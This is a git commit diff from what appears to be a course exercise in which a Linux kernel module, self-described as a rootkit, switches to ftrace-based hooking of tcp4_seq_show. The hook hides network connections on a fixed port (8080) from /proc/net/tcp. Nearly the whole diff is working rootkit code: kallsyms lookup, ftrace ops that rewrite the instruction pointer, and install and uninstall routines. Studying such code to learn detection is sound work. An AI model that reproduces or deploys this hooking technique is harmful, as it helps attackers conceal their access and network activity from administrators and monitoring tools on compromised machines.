5d61c01d3cf14f3000a9323c480bf026316c2600
roei502 <roei502@gmail.com>
2022-02-12 07:24:33 -0500

    finish q3 hooking with ftrace

--- 3/q3.c
+++ 3/q3.c
@@ -9,50 +9,36 @@
 #include <linux/proc_fs.h>
 #include <linux/net_namespace.h>
 #include <linux/seq_file.h>
-
-#include <linux/proc_ns.h>
-#include <linux/refcount.h>
-#include <linux/spinlock.h>
-#include <linux/atomic.h>
-#include <linux/binfmts.h>
-#include <linux/sched/coredump.h>
-#include <linux/sched/task.h>
+#include <linux/ftrace.h>
 
 MODULE_LICENSE("GPL");
 
 #define HIDE_PORT 0x1f90
 #define DEBUG
 
+#define HOOK(_name, _hook, _orig)   \
+{                   \
+    .name = (_name),        \
+    .function = (_hook),        \
+    .original = (_orig),        \
+}
 
-struct proc_dir_entry {
-    unsigned int low_ino;
-    umode_t mode;
-    nlink_t nlink;
-    kuid_t uid;
-    kgid_t gid;
-    loff_t size;
-    const struct inode_operations *proc_iops;
-    /*
-     * NULL ->proc_fops means "PDE is going away RSN" or
-     * "PDE is just created". In either case, e.g. ->read_proc won't be
-     * called because it's too late or too early, respectively.
-     *
-     * If you're allocating ->proc_fops dynamically, save a pointer
-     * somewhere.
-     */
-    const struct file_operations *proc_fops;
-    struct proc_dir_entry *next, *parent, *subdir;
-    void *data;
-    void *read_proc;
-    void *write_proc;
-    atomic_t count;     /* use count */
-    int pde_users;  /* number of callers into module in progress */
-    struct completion *pde_unload_completion;
-    struct list_head pde_openers;   /* who did ->open, but not ->release */
-    spinlock_t pde_unload_lock; /* proc_fops checks and pde_users bumps */
-    u8 namelen;
-    char name[];
+struct ftrace_hook {
+    const char *name;
+    void *function;
+    void *original;
+
+    unsigned long addr;
+    struct ftrace_ops ops;
 };
+
+static void notrace callback_func(unsigned long ip, unsigned long parent_ip, struct ftrace_ops *ops, struct pt_regs *regs)
+{
+    struct ftrace_hook *hook = container_of(ops, struct ftrace_hook, ops);
+
+    if(!within_module(parent_ip, THIS_MODULE))
+        regs->ip = (unsigned long) hook->function;
+}
 
 asmlinkage static int (*original_tcp4_seq_show)(struct seq_file *seq, void *v);
 
@@ -69,6 +55,51 @@ asmlinkage static int hooked_tcp4_seq_show(struct seq_file *seq, void *v){
     return original_tcp4_seq_show(seq, v);
 }
 
+static int install_hook(struct ftrace_hook *f_hook){
+    printk(KERN_INFO "[+] rootkit installing hook on %s\n", f_hook->name);
+    int err;
+    f_hook->addr = kallsyms_lookup_name(f_hook->name);
+    if (!f_hook->addr)
+    {
+        printk(KERN_INFO "[-] rootkit error finding address of %s\n", f_hook->name);
+        return -ENOENT;
+    }
+    *((unsigned long*) f_hook->original) = f_hook->addr;
+
+    f_hook->ops.func = callback_func;
+    f_hook->ops.flags = FTRACE_OPS_FL_SAVE_REGS | FTRACE_OPS_FL_RECURSION_SAFE | FTRACE_OPS_FL_IPMODIFY;
+    err = ftrace_set_filter_ip(&f_hook->ops, f_hook->addr, 0, 0);
+    if (err)
+    {
+        printk(KERN_INFO "[-] rootkit error setting filter to %s. err code %d\n", f_hook->name, err);
+        return -ENOENT;
+    }
+    err = register_ftrace_function(&f_hook->ops);
+    if (err)
+    {
+        printk(KERN_INFO "[-] rootkit error registering function %s. err code %d\n", f_hook->name, err);
+        ftrace_set_filter_ip(&f_hook->ops, f_hook->addr, 1, 0);
+    }
+    printk(KERN_INFO "[+] rootkit success installing hook on %s\n", f_hook->name);
+    return 0;
+}
+
+
+static int uninstall_hook(struct ftrace_hook *f_hook){
+    printk(KERN_INFO "[+] rootkit uninstalling hook on %s\n", f_hook->name);
+    int err;
+
+    err = unregister_ftrace_function(&f_hook->ops);
+    if(err)
+    {
+        printk(KERN_INFO "[-] rootkit error whine unregister_ftrace_function. error code %d\n", err);
+    }
+    printk(KERN_INFO "[+] rootkit success uninstalling hook on %s\n", f_hook->name);
+    return 0;
+}
+
+struct ftrace_hook tcp4_show_hook = HOOK("tcp4_seq_show", hooked_tcp4_seq_show, &original_tcp4_seq_show);
+
 static int __init init_rootkit(void) {
     printk(KERN_INFO "[+] rootkit init_rootkit\n");
 
@@ -80,39 +111,14 @@ static int __init init_rootkit(void) {
     }
     printk(KERN_INFO "[+] rootkit tcp4_seq_show = %p\n", original_tcp4_seq_show);
 
-    //struct net *net;
-    //net = get_proc_net(inode);
-
-    struct tcp_seq_afinfo * my_afinfo = NULL;
-    struct proc_dir_entry * my_proc_net = init_net.proc_net->subdir;
-    
-    // find the tcp entry in proc_net
-    do {
-        if (strncmp(my_proc_net->name, "tcp", 3) == 0)
-        {
-            break;
-        }
-        my_proc_net = my_proc_net->next;
-    }
-    while (my_proc_net != NULL);
-
-    //TODO: what happend if there is no tcp file?????
-    printk(KERN_INFO "[+] rootkit found the correct my_proc_net entry %s\n", my_proc_net->name);
-    
-    /*my_afinfo = (struct tcp_seq_afinfo*)my_proc_net->data;
-    // set the hook to our function.
-    my_afinfo->seq_ops.show = hooked_tcp4_seq_show;
-    printk(KERN_INFO "[+] rootkit hooked the tcp_seq_show\n");
-*/
-    //remove_proc_entry("tcp", my_proc_net);
-    //proc_create_net_data("tcp", 0444, my_proc_net, &hooked_tcp4_seq_ops, sizeof(struct tcp_iter_state), &tcp4_seq_afinfo);
-
+    install_hook(&tcp4_show_hook);
     return 0;
+
 }
 
 static void __exit exit_rootkit(void) {
-    printk(KERN_INFO "[+] rootkit exit_rootkit\n");    
-    //TODO: revert to original
+    printk(KERN_INFO "[+] rootkit exit_rootkit\n");
+    uninstall_hook(&tcp4_show_hook);
 
     return;
 }
